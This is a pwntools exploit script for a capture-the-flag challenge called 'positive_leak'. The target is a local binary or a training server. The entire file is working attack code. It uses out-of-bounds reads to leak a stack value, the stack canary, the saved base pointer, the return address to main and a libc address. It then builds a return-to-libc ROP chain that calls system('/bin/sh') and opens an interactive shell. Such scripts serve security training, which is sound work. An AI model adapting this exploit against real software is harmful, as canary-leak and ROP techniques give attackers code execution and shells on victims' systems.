from pwn import *

CHALL_PATH = "./positive_leak_patched"
LIBC_PATH = "./downloads/libc.so.6"
LIBC = ELF(LIBC_PATH)
CHALL = ELF(CHALL_PATH)

#brva 0x13D3
#brva 0x145A
COMMANDS = """
brva 0x145A
c
"""

context.arch = "amd64"

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
    #input("wait")
elif args.REM:
    c = remote("positive-leak.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)


c.recvuntil(b"> ")
c.send(b"0")

c.recvuntil(b"> ")
c.send(b"15") # Insert size

c.recvuntil(b"#> ")
c.send(b"1")


for i in range(10):
    c.recvuntil(b"#> ")
    c.send(str(i).encode())

c.recvuntil(b"#> ")
c.send(str(47244640256).encode()) # Numbers to keep the correct values on the stack

c.recvuntil(b"#> ")
c.send(str(281453501874176).encode()) # Numbers to keep the correct values on the stack

c.recvuntil(b"#> ")
c.send(str(555).encode())

c.recvuntil(b"#> ")
c.send(str(-1).encode()) # Stop the copy and leak the next value

c.recvuntil(b"> ")
c.send(b"1")

c.recvuntil(b"-1\n")
tmp_addr = int(c.recvline()[:-1]) # Get the leaked value

c.recvuntil(b"> ")
c.send(b"0")

c.recvuntil(b"> ")
c.send(b"15") # Insert size

c.recvuntil(b"#> ")
c.send(b"1")

for i in range(10):
    c.recvuntil(b"#> ")
    c.send(str(i).encode())

c.recvuntil(b"#> ")
c.send(str(47244640256).encode())

c.recvuntil(b"#> ")
c.send(str(281453501874176).encode())

c.recvuntil(b"#> ")
c.send(str(555).encode())

c.recvuntil(b"#> ")
c.send(str(tmp_addr).encode())

c.recvuntil(b"#> ")
c.send(str(-1).encode())

c.recvuntil(b"> ")
c.send(b"1")

for i in range(15):
    c.recvline() # Move to the correct line to read
canary = int(c.recvline()[:-1])

if canary < 0:
    print("\nNegative canary, need to restart\n")
    exit()

print("\nCanary: ", hex(canary))


c.recvuntil(b"> ")
c.send(b"0")

c.recvuntil(b"> ")
c.send(b"15") # Insert size

c.recvuntil(b"#> ")
c.send(b"1")

for i in range(10):
    c.recvuntil(b"#> ")
    c.send(str(i).encode())

c.recvuntil(b"#> ")
c.send(str(47244640256).encode())

c.recvuntil(b"#> ")
c.send(str(281453501874176).encode())

c.recvuntil(b"#> ")
c.send(str(555).encode())

c.recvuntil(b"#> ")
c.send(str(tmp_addr).encode())

c.recvuntil(b"#> ")
c.send(str(canary).encode())

c.recvuntil(b"#> ")
c.send(str(-1).encode())

c.recvuntil(b"> ")
c.send(b"1")

for i in range(16):
    c.recvline()
rbp = int(c.recvline()[:-1])

c.recvuntil(b"> ")
c.send(b"0")

c.recvuntil(b"> ")
c.send(b"15") # Insert size

c.recvuntil(b"#> ")
c.send(b"1")

for i in range(10):
    c.recvuntil(b"#> ")
    c.send(str(i).encode())

c.recvuntil(b"#> ")
c.send(str(47244640256).encode())

c.recvuntil(b"#> ")
c.send(str(281453501874176).encode())

c.recvuntil(b"#> ")
c.send(str(555).encode())

c.recvuntil(b"#> ")
c.send(str(tmp_addr).encode())

c.recvuntil(b"#> ")
c.send(str(canary).encode())

c.recvuntil(b"#> ")
c.send(str(rbp).encode())

c.recvuntil(b"#> ")
c.send(str(-1).encode())

c.recvuntil(b"> ")
c.send(b"1")

for i in range(17):
    c.recvline()
ret_main = int(c.recvline()[:-1])

print("Return to main address: ", hex(ret_main))

c.recvuntil(b"> ")
c.send(b"0")

c.recvuntil(b"> ")
c.send(b"15") # Insert size

c.recvuntil(b"#> ")
c.send(b"1")

c.recvuntil(b"#> ")
c.send(str(int(0x58)).encode())

for i in range(1, 10):
    c.recvuntil(b"#> ")
    c.send(str(i).encode())

c.recvuntil(b"#> ")
c.send(str(47244640256).encode())

c.recvuntil(b"#> ")
c.send(str(281453501874176).encode())

c.recvuntil(b"#> ")
c.send(str(555).encode())

c.recvuntil(b"#> ")
c.send(str(tmp_addr).encode())

c.recvuntil(b"#> ")
c.send(str(canary).encode())

c.recvuntil(b"#> ")
c.send(str(rbp).encode())

c.recvuntil(b"#> ")
c.send(str(ret_main).encode())

c.recvuntil(b"#> ")
c.send(b"0")

c.recvuntil(b"#> ")
c.send(b"-1")

c.recvuntil(b"> ")
c.send(b"1")

for i in range(19):
    c.recvline()
libc_leak = int(c.recvline()[:-1])

print("LIBC leak: ", hex(libc_leak))


c.recvuntil(b"> ")
c.send(b"0")

c.recvuntil(b"> ")
c.send(b"15") # Insert size

c.recvuntil(b"#> ")
c.send(b"1")

c.recvuntil(b"#> ")
c.send(str(int(0x58)).encode())

for i in range(1, 10):
    c.recvuntil(b"#> ")
    c.send(str(i).encode())

c.recvuntil(b"#> ")
c.send(str(47244640256).encode())

c.recvuntil(b"#> ")
c.send(str(281453501874176).encode())

c.recvuntil(b"#> ")
c.send(str(555).encode())

c.recvuntil(b"#> ")
c.send(str(tmp_addr).encode())

c.recvuntil(b"#> ")
c.send(str(canary).encode())

c.recvuntil(b"#> ")
c.send(str(rbp).encode())

pop_rdi = 0x10f75b
xor_edx = 0x16e953

libc_base = libc_leak - 172490
print(f"LIBC base: {hex(libc_base)}\n")

# ROP chain
c.recvuntil(b"#> ")
c.send(str(libc_base + int(pop_rdi)).encode())

c.recvuntil(b"#> ")
c.send(str(libc_base + int(next(LIBC.search(b"/bin/sh\x00")))).encode())

c.recvuntil(b"#> ")
c.send(str(libc_base + int(xor_edx)).encode()) # RDX = 0 for 16 bytes alignement

c.recvuntil(b"#> ")
c.send(str(libc_leak + 189814).encode()) # Offset system 189814

c.recvuntil(b"#> ")
c.send(b"-1")

c.interactive()